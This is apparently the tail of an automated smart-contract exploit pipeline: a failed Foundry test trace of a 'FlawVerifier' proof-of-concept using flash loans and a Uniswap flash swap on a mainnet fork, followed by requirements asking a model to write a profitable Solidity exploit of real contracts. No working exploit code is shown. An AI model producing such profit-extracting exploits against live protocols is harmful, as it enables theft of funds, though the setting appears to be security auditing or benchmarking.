    │   │   │   └─ ← [Return] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [25422] 0x398eC7346DcD622eDc5ae82352F02bE94C62d119::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 30000000000000000000 [3e19], 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   ├─ [18171] 0x6D252BaEa75459Ed0077410613c5f6e51cAb4750::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 30000000000000000000 [3e19], 0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [9758] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::05075d6e(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [staticcall]
    │   │   │   │   │   ├─ [2547] 0x5766067108e534419ce13F05899bC3E3F4344948::05075d6e(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Revert] Action requires an active reserve
    │   │   │   └─ ← [Revert] Action requires an active reserve
    │   │   └─ ← [Revert] Action requires an active reserve
    │   └─ ← [Stop]
    ├─ [351] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 10355806 [1.035e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.transfer
  at FlawVerifier.uniswapV2Call
  at 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11.swap
  at FlawVerifier.executeWithUniswapFlashSwap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 218.42ms (34.86ms CPU time)

Ran 1 test suite in 313.00ms (218.42ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2690586)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
